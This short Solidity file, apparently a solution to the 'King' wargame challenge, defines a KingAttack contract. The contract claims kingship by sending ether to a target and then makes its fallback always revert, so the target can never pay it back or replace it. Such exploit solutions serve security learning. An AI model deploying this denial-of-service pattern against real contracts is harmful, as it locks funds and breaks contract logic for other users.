pragma solidity ^0.8.0;

contract KingAttack {
    
    constructor(address _targetAddress) public payable {
        address(_targetAddress).call{value: msg.value}("");
    }

    fallback() external payable{
        revert("Wait for it!");
    }
}